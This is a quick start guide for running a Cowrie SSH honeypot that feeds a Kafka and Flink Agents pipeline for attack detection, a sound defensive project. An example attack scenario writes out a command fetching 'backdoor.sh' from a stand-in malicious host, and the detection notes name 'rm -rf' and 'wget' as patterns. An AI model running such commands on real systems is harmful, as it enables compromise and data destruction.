# Cowrie Honeypot Quick Start Guide

Get real attack data from the internet in minutes!

## 🚀 Quick Start (3 Steps)

### Step 1: Start Cowrie

```bash
# Option A: Using Docker Compose (recommended)
docker compose -f honeypot/docker-compose.yml up -d

# Option B: Standalone
docker run -d \
  --name cowrie \
  -p 2222:2222 \
  -v $(pwd)/cowrie-logs:/cowrie/cowrie/log \
  cowrie/cowrie
```

### Step 2: Run the Demo

```bash
# Copy demo to container
docker cp demo_cowrie.py flinkdockerwithagents-taskmanager-1:/opt/flink/

# Run demo
docker exec -it flinkdockerwithagents-taskmanager-1 bash -c \
  "cd /opt/flink && export PYTHONPATH=/opt/flink/pythonpath/agent-site-packages && python3 demo_cowrie.py"
```

Or use the automated script:
```bash
./run_cowrie_demo.sh
```

### Step 3: Generate Attacks (Optional)

**Option A: Wait for Real Attacks**
- Cowrie will automatically capture attacks from the internet
- Attacks usually start within minutes to hours
- Check logs: `tail -f cowrie-logs/cowrie.json`

**Option B: Simulate Attacks**
```bash
# Try to SSH into the honeypot
ssh root@localhost -p 2222

# Try common passwords
# The honeypot will log all attempts
```

**Option C: Use Sample Data**
- The demo includes sample Cowrie logs for testing
- Works immediately without waiting for real attacks

## 📊 What You'll See

The demo detects:

1. **Brute Force Attacks** - Multiple failed login attempts
2. **Successful Intrusions** - When attackers successfully log in
3. **Malicious Commands** - Dangerous commands like `rm -rf`, `wget`, etc.
4. **File Downloads** - Suspicious files downloaded by attackers
5. **Suspicious Connections** - Connections from known malicious IPs

## 🔍 Viewing Results

### Real-time Logs
```bash
# Watch Cowrie logs in real-time
tail -f cowrie-logs/cowrie.json | jq

# Filter for specific events
tail -f cowrie-logs/cowrie.json | jq 'select(.eventid == "cowrie.login.failed")'
```

### Demo Output
The demo will show:
- Threat alerts with severity levels
- Attack details (IPs, commands, files)
- Recommended actions
- Detection summary

## 🧵 Kafka Data Source (Optional)

If you want Kafka as the data source, this repo can:

- Ship Cowrie JSON lines to Kafka (`cowrie.events`)
- Run a long-running Flink job that consumes from Kafka and applies Flink Agents
- Write alerts back to the dashboard JSON via another Kafka consumer

Start the stack (includes Kafka/ZooKeeper in `honeypot/docker-compose.yml`).

```bash
docker compose -f honeypot/docker-compose.yml up -d
```

To avoid duplicate alerts, you can disable the file-watching processor when using Kafka.

```bash
docker compose -f honeypot/docker-compose.yml up -d --scale log-processor=0
```

Then ensure these Kafka pipeline services are running.

- `flink-pipeline-supervisor` (Kafka topics + Phase 1/1.5/2 Flink jobs — replaces `kafka-topic-init`, `kafka-normalizer`, `kafka-actor-classifier`, `kafka-workflow-processor`; jobs visible on http://localhost:8081 under **Running Jobs**)
- `cowrie-kafka-shipper` (Cowrie file → Kafka `cowrie.events`)
- `kafka-react-augmentor` (Kafka `cowrie.normalized` → **`cowrie.react_alerts`** — Cloudera ReAct + `counter_attack_actions`; requires `.env` Cloudera creds)
- `kafka-alerts-to-dashboard` (Phase 2 `cowrie.alerts` + Phase 3 `cowrie.react_alerts` → `cowrie-dashboard-data.json`)
- `log-processor` (parallel: raw Cowrie file → dashboard JSON; **workflow on hot path** when `COWRIE_KAFKA_PIPELINE=1`; ReAct enrichment via Phase 3 only)

Legacy per-phase sidecars (`kafka-topic-init`, `kafka-normalizer`, `kafka-actor-classifier`, `kafka-workflow-processor`) remain available via `docker compose --profile legacy-sidecars up -d`.

Legacy (opt-in only): `docker compose --profile legacy up -d kafka-flink-job` — old single Flink job that duplicated Phase 2.

Verify the production split:

```bash
ratatoskr test phase1          # submit normalize job, wait for RUNNING
ratatoskr test phase1 --e2e    # publish test event, verify cowrie.normalized schema
ratatoskr test phase2          # submit workflow job, wait for RUNNING
ratatoskr test phase2 --e2e    # publish normalized test event, verify cowrie.alerts
ratatoskr test phase3          # smoke: ReAct augmentor imports + Cloudera config
ratatoskr test phase3 --e2e    # Cloudera ReAct on sample event + cowrie.react_alerts
ratatoskr test production          # smoke: topic routing + hot-path policy
ratatoskr test production --e2e  # one event → cowrie.alerts + cowrie.react_alerts (if Cloudera)
python3 test/test_cowrie_security_alert.py
python3 test/test_react_dashboard_bridge.py
python3 test/test_react_counter_attack_executor.py
```

**Production policy:** workflow on the hot path (auto-block, alerts); ReAct async in `kafka-react-augmentor`. See [PRODUCTION_ARCHITECTURE.md](PRODUCTION_ARCHITECTURE.md).

**Dashboard:** internal ops / ReAct Agent Lab — not hardened for external users. Use SIEM/Grafana for production monitoring.

Set `PHASE1_PYTHON_NORMALIZER=1` on legacy `kafka-normalizer` to use the Python-only loop (no Flink UI entry).

You can watch their logs with:

```bash
docker compose -f honeypot/docker-compose.yml logs -f flink-pipeline-supervisor cowrie-kafka-shipper kafka-react-augmentor kafka-alerts-to-dashboard
```

## 🎯 Example Attack Scenarios

### Scenario 1: Brute Force Attack
1. Attacker tries multiple passwords: `root/123456`, `admin/password`
2. Flink Agents detects pattern
3. Generates HIGH severity alert
4. Recommends blocking IP

### Scenario 2: Successful Intrusion
1. Attacker successfully logs in with `root/root`
2. Flink Agents detects successful login
3. Generates CRITICAL alert
4. Tracks all subsequent commands

### Scenario 3: Malicious Command
1. Attacker executes: `wget http://malicious-site.com/backdoor.sh`
2. Flink Agents analyzes command
3. Detects malicious pattern (`wget`)
4. Generates HIGH severity alert

### Scenario 4: File Download
1. Attacker downloads `backdoor.sh`
2. Flink Agents analyzes filename
3. Detects suspicious extension (`.sh`)
4. Generates alert with file details

## 🔧 Configuration

### Change Ports
Edit `honeypot/docker-compose.yml`:
```yaml
cowrie:
  ports:
    - "2222:2222"  # Change first number to change host port
```

### Adjust Detection Rules
Edit `demo_cowrie.py`:
- Modify `malicious_patterns` in `analyze_command()`
- Adjust severity thresholds
- Add custom detection logic

## ⚠️ Security Notes

1. **Isolation**: Cowrie exposes ports to the internet. Consider:
   - Running in isolated network/VPC
   - Using firewall rules
   - Limiting resource usage

2. **Logs**: Cowrie logs contain attack data:
   - Store securely
   - Don't expose publicly
   - Follow data retention policies

3. **Legal**: Ensure you have permission to:
   - Collect attack data
   - Monitor network traffic
   - Store attacker information

## 📚 Next Steps

1. **Extend Detection**: Add more threat patterns
2. **Integrate SIEM**: Stream alerts to Splunk, ELK, etc.
3. **Add LLM Analysis**: Use LLM to analyze attack patterns
4. **Automated Response**: Auto-block malicious IPs
5. **Multi-Honeypot**: Deploy multiple honeypots

## 🆘 Troubleshooting

### Cowrie not starting
```bash
# Check logs
docker compose -f honeypot/docker-compose.yml logs cowrie

# Check port conflicts
lsof -i :2222
```

### No attacks detected
- Wait longer (attacks can take time)
- Check firewall rules
- Verify port is exposed
- Use sample data for testing

### Demo errors
```bash
# Check Flink Agents installation
docker exec -it flinkdockerwithagents-taskmanager-1 bash -c \
  "export PYTHONPATH=/opt/flink/pythonpath/agent-site-packages && python3 -c 'import flink_agents'"
```

## 📖 Full Documentation

See [COWRIE_DEMO.md](COWRIE_DEMO.md) for:
- Detailed architecture
- Advanced configuration
- Production deployment
- Integration patterns

